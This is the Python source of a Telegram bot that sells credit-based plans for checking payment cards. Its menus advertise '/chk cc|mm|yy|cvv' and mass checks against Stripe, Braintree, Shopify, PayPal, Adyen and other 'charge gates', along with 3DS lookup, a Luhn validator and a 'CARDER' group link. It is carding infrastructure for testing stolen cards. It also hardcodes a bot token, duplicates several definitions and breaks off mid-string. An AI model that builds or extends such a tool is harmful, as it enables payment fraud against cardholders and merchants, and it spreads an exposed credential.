import os
import time 
import logging
import asyncio 
import aiohttp
import re
import psutil
import random
from datetime import datetime, timedelta
from db import get_user, update_user, init_db
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.error import BadRequest
from faker import Faker
import pytz
import uuid
from config import ADMIN_IDS


# === CONFIGURATION ===
# IMPORTANT: Hardcoded bot token and owner ID for direct use (no environment variables required)
TOKEN = "8138635592:AAHoDiNZ7T3uW_av13nEwtXVhRmCqenixm4"
OWNER_ID = 6701573974

# --- New Configuration ---
AUTHORIZATION_CONTACT = "@Kalinuxxx"
OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"
DEFAULT_FREE_CREDITS = 200  # A non-expiring credit pool for free users

# === PERSISTENCE WARNING ===
# The following dictionaries store data in-memory and will be LOST when the bot
# is redeployed. For a production environment on Railway, you MUST replace
# this with a real database solution like PostgreSQL.
#
# A simple approach for your use case would be:
# 1. Add a `psycopg2` or `asyncpg` library to your requirements.txt.
# 2. Set up a PostgreSQL database on Railway.
# 3. Create functions to connect to the database and perform CRUD operations
#    (Create, Read, Update, Delete) on user data.
# 4. Replace `USER_DATA_DB` and `REDEEM_CODES` with calls to these database functions.
#
# --- GLOBAL STATE (In-Memory) ---
user_last_command = {}
AUTHORIZED_CHATS = set()
AUTHORIZED_PRIVATE_USERS = set()
REDEEM_CODES = {} # New dictionary to store redeem codes
USER_DATA_DB = {
    OWNER_ID: {
        'credits': 9999,
        'plan': 'PLUS',
        'status': 'Owner',
        'plan_expiry': 'N/A',
        'keys_redeemed': 0,
        'registered_at': '03-08-2025'
    }
}
# Initialize Faker
fake = Faker()

# === LOGGING SETUP ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# === HELPER FUNCTIONS ===
def escape_markdown_v2(text: str) -> str:
    """Escapes markdown v2 special characters."""
    special_chars = r"([_*\[\]()~`>#+\-=|{}.!])"
    return re.sub(special_chars, r"\\\1", text)

def get_level_emoji(level):
    level_lower = level.lower()
    if "gold" in level_lower:
        return "🌟"
    elif "platinum" in level_lower:
        return "💎"
    elif "premium" in level_lower:
        return "✨"
    elif "infinite" in level_lower:
        return "♾️"
    elif "corporate" in level_lower:
        return "💼"
    elif "business" in level_lower:
        return "📈"
    elif "standard" in level_lower or "classic" in level_lower:
        return "💳"
    return "💡"

def get_vbv_status_display(status):
    if status is True:
        return "✅ LIVE"
    elif status is False:
        return "❌ DEAD"
    else:
        return "🤷 N/A"

def luhn_checksum(card_number):
    """Checks if a credit card number is valid using the Luhn algorithm."""
    digits = [int(d) for d in card_number if d.isdigit()]
    total = 0
    num_digits = len(digits)
    parity = num_digits % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

from db import get_user, update_user  # your async DB functions
from datetime import datetime

DEFAULT_FREE_CREDITS = 200
DEFAULT_PLAN = "Free"
DEFAULT_STATUS = "Free"
DEFAULT_PLAN_EXPIRY = "N/A"
DEFAULT_KEYS_REDEEMED = 0

async def get_user_data(user_id):
    """
    Fetch user data from DB; if not exists, create with defaults then fetch.
    """
    user_data = await get_user(user_id)
    if not user_data:
        now_str = datetime.now().strftime('%d-%m-%Y')
        # Insert new user with defaults
        await update_user(
            user_id,
            credits=DEFAULT_FREE_CREDITS,
            plan=DEFAULT_PLAN,
            status=DEFAULT_STATUS,
            plan_expiry=DEFAULT_PLAN_EXPIRY,
            keys_redeemed=DEFAULT_KEYS_REDEEMED,
            registered_at=now_str
        )
        # Fetch again after insertion
        user_data = await get_user(user_id)
    return user_data


async def consume_credit(user_id: int) -> bool:
    """
    Deduct 1 credit if available. Return True if succeeded.
    """
    user_data = await get_user_data(user_id)
    if user_data and user_data.get('credits', 0) > 0:
        new_credits = user_data['credits'] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


async def add_credits_to_user(user_id: int, amount: int):
    """
    Add credits to user, creating user if needed.
    Return updated credits or None if failure.
    """
    user_data = await get_user_data(user_id)
    if not user_data:
        return None
    new_credits = user_data.get('credits', 0) + amount
    await update_user(user_id, credits=new_credits)
    return new_credits


async def enforce_cooldown(user_id: int, update: Update) -> bool:
    """Enforces a 5-second cooldown per user."""
    current_time = time.time()
    last_command_time = user_last_command.get(user_id, 0)
    if current_time - last_command_time < 5:
        await update.effective_message.reply_text("⏳ Please wait 5 seconds before retrying\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return False
    user_last_command[user_id] = current_time
    return True

from config import OWNER_ID  # Ensure OWNER_ID is loaded from environment or config


# === CONFIG ===
# Only this group is authorized
AUTHORIZED_GROUP_ID = -1002554243871

# List of your bot commands
BOT_COMMANDS = [
    "/start", "/cmds", "/gen", "/bin", "/chk", "/mchk", "/mass",
    "/mtchk", "/fk", "/fl", "/open", "/status", "/credits", "/info"
    "/scr", "/sh", "/seturl", "/sp", "scr", "/remove", "/b3" "/site"
    "/vbv", "/mvbv",
]

from telegram.ext import ApplicationHandlerStop

async def group_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    message = update.effective_message

    # Only check in groups
    if chat.type in ["group", "supergroup"]:
        # If the group is NOT the authorized group
        if chat.id != AUTHORIZED_GROUP_ID:
            if message.text:
                cmd = message.text.split()[0].lower()
                if cmd in BOT_COMMANDS:
                    await message.reply_text(
                        f"🚫 This group is not authorized to use this bot.\n\n"
                        f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                        f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                    )
                    # Stop other handlers from running
                    raise ApplicationHandlerStop
    # In private or the authorized group → do nothing, commands continue

# --- GLOBAL STATE ---
user_last_command = {}
AUTHORIZED_CHATS = set((-1002554243871,))  # Add your authorized group IDs here

BOT_COMMANDS = [
    "start", "cmds", "gen", "bin", "chk", "mchk", "mass",
    "mtchk", "fk", "fl", "open", "status", "credits", "info"
    "scr", "sh", "seturl", "sp", "scr", "remove", "b3", "site"
    "vbv", "mvbv"
]

from telegram.ext import ApplicationHandlerStop, filters

async def group_filter(update, context):
    chat = update.effective_chat
    message = update.effective_message

    # Only check commands in groups
    if chat.type in ["group", "supergroup"]:
        if chat.id not in AUTHORIZED_CHATS:
            # Check if the message contains a command
            if message.entities:
                for ent in message.entities:
                    if ent.type == "bot_command":
                        # Extract command without the "/"
                        cmd_text = message.text[ent.offset+1 : ent.offset+ent.length].split("@")[0].lower()
                        if cmd_text in BOT_COMMANDS:
                            await message.reply_text(
                                f"🚫 This group is not authorized to use this bot.\n\n"
                                f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                                f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                            )
                            # Stop other handlers (so the command is not executed)
                            raise ApplicationHandlerStop
    # Private chats or authorized groups → do nothing


from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    filters,
)

closed_commands = set()

# Check if command is closed
async def check_closed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmd = update.message.text.split()[0][1:].split("@")[0].lower()
    if cmd in closed_commands:
        await update.message.reply_text(
            "🚧 𝗚𝗮𝘁𝗲 𝗨𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗘𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝘀 𝗔𝗿𝗲 𝗼𝗻 𝘁𝗵𝗲 𝗪𝗮𝘆! 🚧"
        )
        return False  # Block command
    return True  # Allow command

# /close
async def close_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /close <command>")
        return
    closed_commands.add(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now closed.")

# /restart
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /restart <command>")
        return
    closed_commands.discard(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now available.")

# Example command
async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ /sh command executed!")

# Wrapper to block closed commands
def command_with_check(handler_func, command_name):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if command_name in closed_commands:
            await update.message.reply_text(
                "🚧 𝗚𝗮𝘁𝗲 𝗨𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗘𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝘀 𝗔𝗿𝗲 𝗼𝗻 𝘁𝗵𝗲 𝗪𝗮𝘆! 🚧"
            )
            return
        await handler_func(update, context)
    return wrapper



from datetime import datetime
import logging
import re
import pytz
import requests
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Assuming these imports and functions exist in your project.
from db import get_user

# --------------------
# Configuration
# --------------------
# Links for the inline keyboard buttons
BULLET_GROUP_LINK = "https://t.me/CARDER33"
OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"
DEV_LINK = "https://t.me/Kalinuxxx"

# Set up logging for better error tracking
logger = logging.getLogger(__name__)

# --------------------
# Utility Functions
# --------------------
def build_final_card(*, user_id: int, username: str | None, credits: int, plan: str, date_str: str, time_str: str) -> str:
    """
    Constructs the final profile card text for the welcome message using HTML.
    """
    uname = f"@{username}" if username else "N/A"
    
    # HTML-formatted clickable bullet with the ⌇ character and brackets
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    return (
        "✦━━━━━━━━━━━━━━✦\n"
        "     ⚡ <b>Welcome</b>\n"
        "✦━━━━━━━━━━━━━━✦\n\n"
        f"{bullet_link} ID       : <code>{user_id}</code>\n"
        f"{bullet_link} Username : <code>{uname}</code>\n"
        f"{bullet_link} Credits  : <code>{credits}</code>\n"
        f"{bullet_link} Plan     : <code>{plan}</code>\n"
        f"{bullet_link} Date     : <code>{date_str}</code>\n"
        f"{bullet_link} Time     : <code>{time_str}</code>\n\n"
        "➤ <b>Please click the buttons below to proceed</b> 👇"
    )

async def get_user_cached(user_id, context):
    """
    Retrieves user profile data from the database, using a cache
    (context.user_data) to speed up subsequent calls.
    """
    if "profile" in context.user_data:
        return context.user_data["profile"]
    user_data = await get_user(user_id)
    context.user_data["profile"] = user_data
    return user_data

def get_main_keyboard() -> InlineKeyboardMarkup:
    """
    Creates and returns the main inline keyboard.
    """
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚪 Gates", callback_data="gates_menu"),
            InlineKeyboardButton("📦 Pricing", callback_data="tools_menu")  # Changed here
        ],
        [
            InlineKeyboardButton("💎 Owner", url=DEV_LINK),
            InlineKeyboardButton("🔐 3DS Lookup", callback_data="ds_lookup")
        ],
        [
            InlineKeyboardButton("👥 Official Group", url=OFFICIAL_GROUP_LINK)
        ]
    ])


async def build_start_message(user, context) -> tuple[str, InlineKeyboardMarkup]:
    """
    Assembles the complete message text and keyboard for the welcome message.
    """
    tz = pytz.timezone("Asia/Kolkata")
    now_dt = datetime.now(tz)
    date_str = now_dt.strftime("%d-%m-%Y")
    time_str = now_dt.strftime("%I:%M %p")
    user_data = await get_user_cached(user.id, context)
    credits = int(user_data.get("credits", 0))
    plan = str(user_data.get("plan", "Free"))
    
    text = build_final_card(
        user_id=user.id,
        username=user.username,
        credits=credits,
        plan=plan,
        date_str=date_str,
        time_str=time_str,
    )
    return text, get_main_keyboard()

# --------------------
# Command and Callback Handlers
# --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles the /start command, sending a welcome photo and message.
    """
    user = update.effective_user
    logger.info(f"/start by {user.id} (@{user.username})")
    text, keyboard = await build_start_message(user, context)
    msg = update.message or update.effective_message

    image_url = "https://i.ibb.co/YFDvs5fr/6190727515442629298.jpg"
    try:
        # Fetch the image content directly to avoid Telegram's URL validation issues
        response = requests.get(image_url)
        response.raise_for_status()
        photo_bytes = BytesIO(response.content)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to fetch image from URL: {e}")
        await msg.reply_text(
            text=f"⚠️ An error occurred while loading the welcome image.\n\n{text}",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )
        return

    await msg.reply_photo(
        photo=photo_bytes,
        caption=text,
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

async def back_to_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler to go back to the main menu."""
    q = update.callback_query
    await q.answer()
    text, keyboard = await build_start_message(q.from_user, context)
    try:
        # This call correctly uses edit_message_caption because it's attached to the photo
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit caption, sending new message: {e}")
        await q.message.reply_photo(
            photo="https://i.ibb.co/YFDvs5fr/6190727515442629298.jpg", # Re-send the image
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )

async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Pricing' button showing premium plans."""
    q = update.callback_query
    await q.answer()

    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (

         "✧━✧💎𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵𝑺💎✧━✧\n\n"
        "🚀 <b>Starter Plan</b>\n"
        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 300\n"
        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : 7 Days\n"
        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : 3$\n"
        "────────────────────────\n"

        "🌟 <b>Premium Plan</b>\n"
        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 1000\n"
        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : 30 Days\n"
        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : 10$\n"
        "────────────────────────\n"

        "💎 <b>Plus Plan</b>\n"
        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 2000\n"
        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : 60 Days\n"
        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : 19$\n"
        "────────────────────────\n"

        "⚡ <b>Custom Plan</b>\n"
        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 3000\n"
        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : Custom\n"
        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : Custom\n"
        "────────────────────────\n\n"

        "<b><i>💎All premium users will be provided with 0.98$ sites</i></b>\n"
        "<b><i>Full Help & Support for any issue</i></b>\n"
        "✦━━━━━━━━━━━━━━━━━━━━✦"
    )

    keyboard = [
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
    ]

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def gates_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Gates' button."""
    q = update.callback_query
    await q.answer()

    # Stylish single-line header
    header = "━━❖🚪 GATES MENU 🚪❖━━\n\n"

    # Bullet link for uniformity
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        f"{header}"
        f"{bullet_link} <b>𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘼𝙘𝙘𝙚𝙨𝙨 𝙖𝙪𝙩𝙝𝙚𝙣𝙩𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n"
        f"{bullet_link} <b>𝐂𝐡𝐚𝐫𝐠𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘼𝙘𝙘𝙚𝙨𝙨 𝙥𝙖𝙮𝙢𝙚𝙣𝙩/𝙘𝙝𝙖𝙧𝙜𝙚 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n\n"
        "<b><i>💡 Need Assistance? 🌟 Full Support Available!</i></b>"
    )

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⚡ Auth", callback_data="auth_sub_menu"),
            InlineKeyboardButton("💳 Charge", callback_data="charge_sub_menu")
        ],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )


async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Auth' button."""
    q = update.callback_query
    await q.answer()
    
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
    
    text = (
        "✦━━━✦🚪 𝘼𝙐𝙏𝙃 𝙂𝘼𝙏𝙀𝙎 🚪✦━━✦\n\n"
        
        "💎<b>Stripe Auth</b>💎\n"
        f"{bullet_link} 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤 : <code>/chk cc|mm|yy|cvv</code>\n"
        f"{bullet_link} 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤   : <code>/mass cc|mm|yy|cvv</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬       : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   : 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
        "────────────────────────\n\n"
        "💎<b>Braintree Premium</b>💎\n"
        f"{bullet_link} 𝐒𝐢𝐧𝐠𝐥𝐞 𝐀𝐮𝐭𝐡  : <code>/b3 cc|mm|yy|cvv</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬       : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   : 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n"
        "────────────────────────\n\n"

        "🛡️✨ 𝘼𝗹𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 | 𝗡𝗼 𝗥𝗮𝘁𝗲 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗶𝗼𝗻𝘀!\n"
        "✦═════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")]
    ])
    
    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )




from telegram import InlineKeyboardButton, InlineKeyboardMarkup

async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Charge' button."""
    q = update.callback_query
    await q.answer()

    text = (
        "❖══💳 CHARGE GATEWAYS 💳══❖\n\n"
        "💎✨𝘚𝘦𝘭𝘦𝘤𝘵 𝘢 𝘊𝘩𝘢𝘳𝘨𝘦 𝘎𝘢𝘵𝘦 𝘉𝘦𝘭𝘰𝘸✨💎"
    )

    # --- Buttons in 2 columns ---
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("💸 Shopify 0.98$", callback_data="shopify_gate"),
            InlineKeyboardButton("⚡ Auto Shopify", callback_data="autoshopify_gate")
        ],
        [
            InlineKeyboardButton("💳 Stripe 1$", callback_data="stripe_gate"),
            InlineKeyboardButton("💳 Stripe 3$", callback_data="stripe3_gate")
        ],
        [
            InlineKeyboardButton("💵 Shopify 10$", callback_data="shopify10_gate"),
            InlineKeyboardButton("🏦 Authnet 1.0$", callback_data="authnet36_gate")
        ],
        [
            InlineKeyboardButton("🌊 Ocean Payments 4$", callback_data="ocean_gate"),
            InlineKeyboardButton("💳 Adyen 1$", callback_data="adyen_gate")  
        ],
        [
            InlineKeyboardButton("💰 PayPal 1$", callback_data="paypal1_gate"),  # ✅ New button            
            InlineKeyboardButton("💰 PayPal Payments 9$", callback_data="paypal_gate")
        ],
        [
            InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")
        ]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )





async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Shopify 0.98$' button."""
    q = update.callback_query
    await q.answer()

    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝑺𝑯𝑶𝑷𝑰𝑭𝒀 0.98$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   :<code>/sh</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$0.98</i>\n"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )

async def paypal_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'PayPal Payments 9$' button."""
    q = update.callback_query
    await q.answer()

    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝑷𝒂𝒚𝑷𝒂𝒍 9$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   :<code>/py</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>PayPal</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$9.00</i>\n"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )


async def paypal1_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'PayPal Payments 1$' button."""
    q = update.callback_query
    await q.answer()

    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝑷𝒂𝒚𝑷𝒂𝒍 1$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   :<code>/pp</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>PayPal</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1.00</i>\n"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )




async def adyen_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Adyen 1$' button."""
    q = update.callback_query
    await q.answer()

    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐀𝐝𝐲𝐞𝐧 1$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   :<code>/ad</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Adyen</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1</i>\n"
    )

    keyboard = [
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ]

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),
            disable_web_page_preview=True
        )




async def ocean_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'Ocean Payments 4$' button."""
    q = update.callback_query
    await q.answer()

    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐎𝐜𝐞𝐚𝐧 𝐏𝐚𝐲𝐦𝐞𝐧𝐭𝐬 4$ ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   :<code>/oc</code>\n"
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Ocean Payments</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$4</i>\n"
    )

    # Define buttons as a list of rows
    keyboard = [
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ]

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)  # wrap once
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard),  # wrap once
            disable_web_page_preview=True
        )




async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"

    text = (
        "✦═══ 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 ═══✦\n\n"
        f"{bullet_link} 𝐂𝐌𝐃   : <code>/sp</code>\n"
        f"{bullet_link} 𝐌𝐚𝐬𝐬     : <code>/msp</code>\n"
        f"{bullet_link} 𝐎𝐰𝐧 𝐒𝐢𝐭𝐞  : <code>/seturl &lt;site&gt;</code>\n"
        f"{bullet_link} 𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐒𝐢𝐭𝐞𝐬 : <code>/adurls &lt;site&gt;</code>\n\n"
